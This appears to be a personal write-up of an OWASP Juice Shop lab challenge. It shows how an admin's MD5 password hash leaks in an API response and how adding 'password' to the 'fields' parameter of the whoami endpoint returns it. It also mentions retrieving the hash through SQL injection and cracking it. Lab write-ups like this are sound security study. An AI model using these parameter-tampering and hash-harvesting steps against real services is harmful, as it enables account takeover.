- Use burpsuite to observe traffic
- Try login and logout
- See the password hash in `GET /rest/saveLoginIp HTTP/1.1`
```
HTTP/1.1 200 OK
[...]
{"id":1,"username":"","email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","totpSecret":"","isActive":true,"createdAt":"2026-07-06T03:10:21.790Z","updatedAt":"2026-07-06T03:10:21.790Z","deletedAt":null}
```
- Note: When I try login and logout again, the response I get is
```
HTTP/1.1 304 Not Modified
[...]
```
without the json body like above.
- Simply deleting the cache and login and logout again will show the earlier json
- But how do I complete the challenge?
- Notice there is also `GET /rest/user/whoami?fields=email HTTP/1.1`, which returns exactly
```
{"user":{"email":"admin@juice-sh.op"}}
```
- First, I see that it displays the information of the argument `email` of the `fields` parameter. Second, I also know that there is a literal field named `password` from `saveLoginIp` earlier
- Go to http://localhost:3000/rest/user/whoami?fields=email,password
- See
```
{"user":{"email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500"}}
```
- Complete the challenge
- Note: I already can extract the hash through SQL injection as I described in [[password-strength]]. The process to extract the password is exactly like what I described in [[password-strength]] using MD5 tools.